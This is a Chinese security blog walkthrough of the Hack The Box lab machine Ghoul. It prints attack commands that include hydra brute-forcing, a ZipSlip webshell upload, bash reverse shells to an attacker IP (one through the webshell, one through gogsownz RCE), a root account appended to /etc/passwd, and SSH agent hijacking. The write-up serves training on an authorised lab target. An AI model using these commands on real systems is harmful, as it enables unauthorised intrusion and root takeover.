@@ -1,0 +1,358 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/tyLoxQol3DY62NF2684qKg)
+
+一个每日分享渗透小技巧的公众号![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCWsznInTj3b9TFYtTDIYG6lDGJZYYSv72NsVWF24Kjlo4MT29tEOQSg/640?wx_fmt=png)
+
+  
+
+  
+
+大家好，这里是 **大余安全** 的第 **154** 篇文章，本公众号会每日分享攻防渗透技术给大家。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/x2A34tB6DJ1OkPcdribDzibshJwyiacGV0dL6xyJSMoUODic9LUULgNOnWiciaLpD2A7HtR7e6GqhqAkw8zXBObGceYA/640?wx_fmt=png)
+
+靶机地址：https://www.hackthebox.eu/home/machines/profile/187
+
+靶机难度：高级（3.3/10）
+
+靶机发布日期：2019 年 11 月 13 日
+
+靶机描述：
+
+Ghoul is a hard difficulty linux box which tests enumeration and situational awareness skills. A zip file upload form is found to be vulnerable to ZipSlip, which can be used to upload a shell to the web server. A few readable SSH keys are found on the box which can be used to gain shells as other users. A user is found to have access to another host on the network. The second host is found to have an older version of Gogs server running. A git repo found on the Gogs server is found to contain sensitive information, which can be used to gain a shell as root. An incoming SSH connection is found to be using SSH agent forwarding, and can be hijacked to gain root shell on the host.
+
+请注意：对于所有这些计算机，我是通过平台授权允许情况进行渗透的。我将使用 Kali Linux 作为解决该 HTB 的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，我概不负责。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/Rhl7Fe1Ew2icdiaxAoicRDTOcic6uZqjKNRuQTmL2KnOQaSBwas6DeYNdq479WEFto9n2bssQXlvVic2bGGlQghxWVg/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/xMTwOwcXNfzGaphWRyvoDsqKZMNRzWyK9jZgBFCFiaUicsfjRIcJujZSqLEibyYfNiarNYWErKxru7g4kVOh5fIC9g/640?wx_fmt=png)
+
+一、信息收集
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dSKpg9xnNrrMDovSVypoREMmicTSlujj0ia1qEOTFMu8hofoKxGgVuZGA/640?wx_fmt=png)  
+
+可以看到靶机的 IP 是 10.10.10.101...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6d6cWOMucbD3JqYb8CwaSHtRDDqezGX3VyGxRsVLYG4zUYgKMI3icgsLw/640?wx_fmt=png)
+
+nmap 发现开放了 SSH 和 Apache 服务， 端口 2222 上还有另一个 SSH 服务器... 发现 Tomcat 在端口 8080 上运行着....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dwgRJeXMZIy4XeEAFiagCBqmH8w4KiaBwqKq2R6L8RsQUkxD5KFuKe9Aw/640?wx_fmt=png)
+
+看到了动漫的图片很炫酷... 但是只有一些简单的用户名信息...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dxp7mYXGGZnLFguZfBcGV25v7ic4OpjHPuUCQQuicOah7d4THYezzjNcg/640?wx_fmt=png)
+
+爆破目录获得了一些有用的信息...secret.php 等...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dV6uFQqUGkdxC6gf3YB6dW0ty6pT8KicpYaoIr16p2LH423Pv5w6xJpQ/640?wx_fmt=png)
+
+内容聊天提示网站的某个地方有 RCE...Kaneki 有一个远程服务器... 有一个用于上传图片的艺术网站...
+
+域渗透？？文件上传？？
+
+其中还有 hash 值，和最后的一串字符... 先存着信息..
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6d12ZGAHurt3l4V5SgPd1kbTbA05MmcB0t9LLuLWgL6uwd9hSYhlp9ibA/640?wx_fmt=png)
+
+爆破还获得了 users 目录页面... 登陆页面...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dACENdFMwfh78O6xg54H1nIBQVXnUuDjSjkhTx2t7CicXRfYrFsQKCnw/640?wx_fmt=png)
+
+burpsuit 拦截准备爆破看看...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dlVDCC18ibv1snDEHlbDt2ZtLpzo2lJEdrBiapKib3Ww5LEc3vXeFum9Ig/640?wx_fmt=png)
+
+```
+hydra -l admin -P /usr/share/seclists/Passwords/twitter-banned.txt 10.10.10.101 http-post-form "/users/login.php:Username=^USER^&Password=^PASS^&Submit=Login:Invalid Login Details"
+```
+
+爆破获得了用户名密码... 去登陆...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6du7UzVrSTfdbmJpAhwEphnbAJhriaPmXwibxrIOGR91Af9JMvJT25YMqg/640?wx_fmt=png)
+
+魔鬼 flag.... 此路不通...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dia1qlfyfTF2uXJvpPHdJGHHP7dt4OczicLKsiaAGlicWcDiaSmDcRpXHrAA/640?wx_fmt=png)
+
+8080 页面也是需要登陆的页面...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dp0EjNw44loklhY0k9cutbmycQic5qXCiaUvOiasd17prRE6Qonk5MHOoA/640?wx_fmt=png)
+
+尝试简单的 admin/admin 成功登陆...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dJVtdcaaYpqicLAwUpibNBJFCicvOExTtPWkDc3Xxn7a4O2CiaEmzPvc62w/640?wx_fmt=png)
+
+Google 搜索恶意 zip 文件上传时，第一个链接是这篇来自 [Naked Security](https://nakedsecurity.sophos.com/2018/06/06/the-zip-slip-vulnerability-what-you-need-to-know/) 的文章，许多 zip 程序在解压缩 zip 文件时并未对路径进行遍历检查，还说了允许在 Web 进程可以写入的任何位置进行任意写入...
+
+发生这种情况是因为 zip 文件存储的文件带有相对路径，相对于它们解压缩到的目录中漏洞在于，可以使用 path 将文件放入 zip 文件中../../../../../../../../../../etc/passwd，并且它将解压缩并尝试覆盖 / etc/passwd 主机上的文件...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6ddPLTJGm0Loqnv7PchoDETyU5c58UWGE2esdPlzatXLPGGFwTibiaiaA7g/640?wx_fmt=png)
+
+```
+sudo cp cmd.php /var/www/html/
+zip cmd.zip ../../../../../../var/www/html/cmd.php
+```
+
+按照方法，做了个恶意 ZIP 文件....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dbTLekRQUScfVGCsnnknZ7E2CAJNojUuH9hwvmBibdXiaxVYIywerVicEQ/640?wx_fmt=png)
+
+成功上传...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dKypC6qsTX5jNmYoFLKo4biccIDPSp8PeIO5fQhCvK9KcpG6yLenduUw/640?wx_fmt=png)
+
+```
+curl http://10.10.10.101/cmd.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.51/443 0>&1'"
+```
+
+在 webshell 中运行基本的 bash rev shell 会给我回调外壳...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6duAlQ4ywWiaCp0MYciaRRRtRTr0lvZIOyXcI0IuPa57c15LJTaxsibUc1g/640?wx_fmt=png)
+
+```
+openssl passwd dayu
+echo "rooot:KBzWUbGJVL4Kk:0:0:root:/root:/bin/bash" >> /etc/passwd
+```
+
+尝试 zip 再次使用此漏洞利用来覆盖 / etc/passwd.... 创建好上传，覆盖了...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dSiaNlmibXv7aE36Dy35umBpRXSPPO0EOWCZnIGmNfmmjVeFcMAuU2yTA/640?wx_fmt=png)
+
+成功通过创建的 ID，获得了 root 权限外壳...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dibS5GdZlzibtCWIkWyFaMePl0xeFOJSiaBZornVFJTibl55VUoSRMcreSg/640?wx_fmt=png)
+
+通过 root 权限外壳，获得了 user_flag 信息....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6deFI5p7BicWibPMLkxoIWPkOryTpmickiaOdLH54UOxzWW0bdZNw9LianjoQ/640?wx_fmt=png)
+
+```
+for i in {1..255}; do ping -c 1 172.20.0.$i; done | grep 'ttl='
+```
+
+由于前面对话提示就知道目前渗透的领域是多台服务器跳转的... 查看 IP 后，知道了目前所在的环境服务器是 172.20.0.10IP... 通过 ping 查询到了改段还存在 172.20.0.150 服务器...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dwOMoyMaWOBCvRZvF2oK61ictWibY47xguS940ibqYo5iaSrU4D3ZPu9L0A/640?wx_fmt=png)
+
+并且这里还存在类似密码的信息提示...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dHVsCaMy6nOHALlObUU127EOGovhuOIQWtUBoQPVY8lkPyEzpO0qBOw/640?wx_fmt=png)
+
+```
+ssh -i id_rsa kaneki_pub@172.20.0.150
+```
+
+目前猜测 0.150 服务器是 kaneki 用户的... 利用 ssh 登陆，并用对话中获得的密码... 成功登陆...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dHVsCaMy6nOHALlObUU127EOGovhuOIQWtUBoQPVY8lkPyEzpO0qBOw/640?wx_fmt=png)
+
+继续查询 IP 情况，存在 18 段的服务器...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dHcVdTWUjL1xJAWyiaO1Mzx94jJgsWnLj6Rz4KhoicUxBKdmT9B51u9Kg/640?wx_fmt=png)
+
+```
+for i in {1..254}; do (ping -c 1 172.18.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
+```
+
+前面查找 IP 的太慢了... 换了一个...
+
+发现了 172.18.0.2IP 存在....1 服务器应该是最终要到达的 root_flag 服务器吧... 继续跳
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6de0WJuHBZ82qrmSSFjzibeD4D9B9XBVibv1oIfJTuSXoAx3vSA1aOZf0Q/640?wx_fmt=png)
+
+虽然知道了 172.18.0.2 存在，但是为了准确认证下一步跳的服务器是哪儿... 我上传了 nmap 进行扫描看看....
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6diaia1YTYS2rnqoeHdqbXh1Qc9oMnNh8UcAuwEH33eibdE6AAHkcErOexw/640?wx_fmt=png)
+
+通过 nmap 发现了 172.18.0.2 服务器开放着 3000 端口...3000 端口 google 找发现是 gogs？？
+
+Gogs 是一款极易搭建的自助 Git 服务。开发目的 Gogs 的目标是打造一个最简单、最快速和最轻松的方式搭建自助 Git 服务....
+
+是这么解释的...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dKfJ0EpiavlhiaV2EK3fPkhu6QpW7rtTfZsPBWIqLhLLrOuK5t6vkO3cQ/640?wx_fmt=png)
+
+```
+ssh -i id_rsa kaneki_pub@172.20.0.150 -L 3000:172.18.0.2:3000
+```
+
+将 root 对于 3000 端口的流量通过端口转发到本地 kali 上... 因此，我需要先将流量转发到 Aogiri 服务器上... 可看到成功转上去了
+
+还发现了一个文本 txt，读取后提示了用户名：AogiriTest
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dicEjtVlA3URriaJ3WsJIeUEwiaWgHPX5IUj5Ue2QLvpXleiblfPibgO5Nug/640?wx_fmt=png)
+
+因为围绕着跳转，离不开 ssh 服务利用，回到前面 172.20.0.10 服务器上，读取 ssh 的 key... 因此可以继续从 172.20.0.10（Aogiri）上跳转到本地 kali 上...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6d6NgObxibNENLRlibrJLzIricqS5su9K444n9yh5k36RM55cO8pibVGeZAg/640?wx_fmt=png)
+
+```
+ssh -i id_rsa root@10.10.10.101 -L 3000:localhost:3000
+```
+
+现在流量在 Aogiri 服务器上，现在通过 key 将 ssh 服务端口转发到了本地... 可以开始访问了
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dllGSB3SkmMC42Yts9gaqMkVribChP3icswfGYOWHRFn60gZ56dFYszjA/640?wx_fmt=png)
+
+通过访问，果然是 gogs 搭建的... 这是登陆页面... 前面在转发中获得了用户名... 还需要 passwd
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dWtMp3O2d0bf97uFDpiaN5H2NC9k85VQf1vIm4ZrvTuU20AGQjBwVPLQ/640?wx_fmt=png)
+
+```
+grep -ir 'password=' / 2> /dev/null
+```
+
+在 Aogiri 服务器上，枚举到了密码信息... 继续登陆
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dmhnJF8vviaY5bCzufdoBAB04B8tnkbnibv9UibByVdvUatPBPwl9Q86Ew/640?wx_fmt=png)
+
+通过成功登陆，下方可以看到 2018 的 gogs，应该存在漏洞... 搜索试试
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dUzQR9vMtyM0gMaWhMmRl69ADh6JJup2Gs9IFnibMAFRxhCNcJ2fhJ6w/640?wx_fmt=png)
+
+google 发现了 github
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dLOa25g7RLf318rInIxQqf62I9sqAI1VO67cEBWgick95PwA37LvRw9g/640?wx_fmt=png)
+
+果然有 EXP 可利用...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6d1KMD88oyicKTBh0Xk8acZTN0sSQV9eicfGc8YFxvyhKSmGP8Q04DfzpA/640?wx_fmt=png)
+
+下载查看帮助...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dicd9ycnicgibaZbkZZ5dqX6QSYCzNZmzqUzNpQgRJ2BtpYTK6o0B0dQFA/640?wx_fmt=png)
+
+```
+python3 gogsownz.py http://127.0.0.1:3000 --creds 'AogiriTest:test@aogiri123' -n i_like_gogits --cleanup -v --rce '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.51/443 0>&1"'
+```
+
+这里有太多方法可以提权... 通过下载的 gogsownz，RCE 漏洞利用...
+
+可以克隆也可以覆盖，甚至各种方式提权...
+
+我利用了最简单的... 获得了外壳...
+
+可看到这是 git 权限外壳下...
+
+查询 SUID，发现 gosu 感兴趣...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dh0jfg0ffuYD0wUjFYzmsl7HPWdicuNx3XLiapf7Kibj8kDEflYzva1mYQ/640?wx_fmt=png)
+
+```
+gosu root:root /bin/bash
+```
+
+查看帮助，发现它以 root 用户的身份执行其他用户的命令，所以以 root 用户的身份执行 bash...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dzoiaqrtgqIZYpHq8cibICDfuVHOX8ANxoP8INTkqGQPrcI1ZaUc8IncQ/640?wx_fmt=png)
+
+还是无法读取 root_flag... 吐了...
+
+发现两个文件... 读取发现了用户名密码...name=kaneki&password=12345ILoveTouka!!!，，无用.... 尝试了...
+
+另外的 7z 文件在此外壳下无法读取和查看...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6d2oYv31138OlbtkhVFlNJbwLgECPHZictTMKrLpZD5ZEUvaaBC0gs2tQ/640?wx_fmt=png)
+
+nc 下载到本地...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dDfMMrWRFQ4TtpxVbp5QIEg5gtHs8WDCVagOykbULNLAHMk2qd5ZicTg/640?wx_fmt=png)
+
+通过 7z 解压后，查看到了文本内容... 这是 git 的存储库...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6d8BeZmCA9l6kDIWhF58MzH9FOJib9EbvlUQ7I7Y4icuWN7AcibXMwIc7bg/640?wx_fmt=png)
+
+```
+git show ORIG_HEAD
+```
+
+通过 git 存储卡 google 搜索，如何查找用户名密码... 给了 ORIG_HEAD 提示... 获得了用户名密码...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dicLSH4HVJeROiby1RpRcmLvtmuN4dib8LicllwXWY6kZNlTAbB9WrGov0Q/640?wx_fmt=png)
+
+在 kaneki-pc 服务器上，成功的 su 进入了 root 权限... 查看 flag，说已经快成功了.... 哎... 还是没到终点...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dxJhrv5351PibBnGmbWsBAf78DO8QdfN0lcDl1wMynTvRfiaPCic3b2G8g/640?wx_fmt=png)
+
+这里耽误了很久...
+
+回看 nmap 发现了 2222 端口 SSH 还没使用过？？
+
+上传 pspy32... 枚举下哪里在运行了 SSH...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dx6EsqlLCtOpichTXN43jQVjXwyccSRNrDSD519SjEDGjhPtViacU3Taw/640?wx_fmt=png)
+
+通过 pspy 枚举进程，发现会几分钟不定时的会运行执行 bash ssh...google 搜索相关资料，提示存在 SSH 代理劫持...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6da6zb3CJjNiaETJqMiceSyPeaaLEib7ESjuUjTO3Uf46SiccVvUp1FkvHWw/640?wx_fmt=png)
+
+```
+https://www.clockwork.com/news/2012/09/28/602/ssh_agent_hijacking/
+```
+
+这篇文件详细的讲述了 SSH 代理劫持的此环节问题... 很详细...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dGcg11JOXzm9vqcukFK8jGibiaCcK49tTWEpP3F5lDibdFgI7FdfG10SEg/640?wx_fmt=png)
+
+重新通过跳转登陆到了 172.20.0.150 服务器上... 清理了 / tmp 目录...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6duxzfpsmic9FWajicFbA1JyzA4Rs5TO1RELzt54O1BXVtZ7Dd0wcvTP0A/640?wx_fmt=png)
+
+可看到，太坑了这里，不定时的有时候 4 分钟，有时候 4 分多... 会自动执行一次...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dNmvw67t4mVG9ORQACXbM4bklVrqdtbkjusg4TFsNU7foibE7X075y2Q/640?wx_fmt=png)
+
+这次捕获到了，由于网络波动，很卡，继续等待，没成功...
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dIruIBKSFGnyqdRL2xbSfOuyAzt1Z5aINSvvicibs82vFH06wlJHjSckw/640?wx_fmt=png)
+
+```
+rm -rf ssh-*
+
+ls -la ssh-X2sLvGoeXy/
+export SSH_AUTH_SOCK=/tmp/ssh-cat8vxxrs3/agent.1759
+ssh-add -l
+ssh root@172.18.0.1 -p 2222
+```
+
+根据 SSH 代理劫持文章的思路，获得了 root 权限... 看看是不是最终的终点...  
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPMzvcxmE9S4tUS2V8hwP6dFdBgR0Srx7Qu14oCOxFroATHP7GLIxZQbcJH9l76Gzk5VM32zqmk5Q/640?wx_fmt=png)
+
+查看到了 root_flag 信息...
+
+可看到此服务器的环境...good
+
+![](https://mmbiz.qpic.cn/mmbiz_png/sGWlDp8sFCl67vCmcZr3JtQP0jB8suQiaKaKCVYPOezloiaicS8xMkAriaAQd3dTOPXicBTVStlX66kEffEWJOiczUTA/640?wx_fmt=png)
+
+这台靶机我给予高级吧，有很多坑，主要很多坑...
+
+zip 文件上传表单容易受到 ZipSlip 的攻击 -- 可读的 SSH 密钥利用 -- 较旧版本的 Gogs 服务器漏洞利用 -- 在 Gogs 服务器上找到的 git repo--SSH 代理转发等等...
+
+这台靶机学到了很新颖的思路，主要学习思路... 技术都是硬的，思路是软的，思路会了对了，你就进步非常快了... 感谢作者
+
+由于我们已经成功得到 root 权限查看 user 和 root.txt，因此完成这台中级的靶机，希望你们喜欢这台机器，请继续关注大余后期会有更多具有挑战性的机器，一起练习学习。
+
+如果你有其他的方法，欢迎留言。要是有写错了的地方，请你一定要告诉我。要是你觉得这篇博客写的还不错，欢迎分享给身边的人。
+
+![](https://mmbiz.qpic.cn/mmbiz_png/o62ddIpxjBd0kv6p3zb6uf1GiaCo9PiaF12hWQQSurxFPuVIDtsNTgUpjjvmib7GxKXNePVMAwJfzuib52MWoORPYg/640?wx_fmt=png)
+
+如果觉得这篇文章对你有帮助，可以转发到朋友圈，谢谢小伙伴~
+
+![](https://mmbiz.qpic.cn/mmbiz_png/c5xrRn4430AnqkfAJc38Vpnc5XiaADLTjiciciaibYU4EHw3Nuh7YMtuB0hz3sb8Em9iatt5skAsibuuysPLdLY5LtWOw/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/p3lIbvldZiabdI5iaCb3icRhtygUuo2sp6Hcdq0ANlpy5W3gL628uq032jsoVnGnl6HdGrgDXjfazFtkp6IInibDdQ/640?wx_fmt=png)
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPqjaFWwyrrhiciahSpOibxqKvSIFX0iaPcG00CjYIwQDwIDeIicmFMlOVNyhWYVSE8pJK566UK3YOUNWQ/640?wx_fmt=png)
+
+随缘收徒中~~ **随缘收徒中~~** **随缘收徒中~~**
+
+欢迎加入渗透学习交流群，想入群的小伙伴们加我微信，共同进步共同成长！
+
+![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  
+
+大余安全
+
+一个全栈渗透小技巧的公众号
+
+![](https://mmbiz.qpic.cn/mmbiz_png/O7dWXt4o5KPTQKiaXksbZia7PmHLPX2vnCSsnsc7MHh257oYRic1MOT8qibABNUEnTq9DUL7QBwnS52EheJf4m8iaTQ/640?wx_fmt=png)
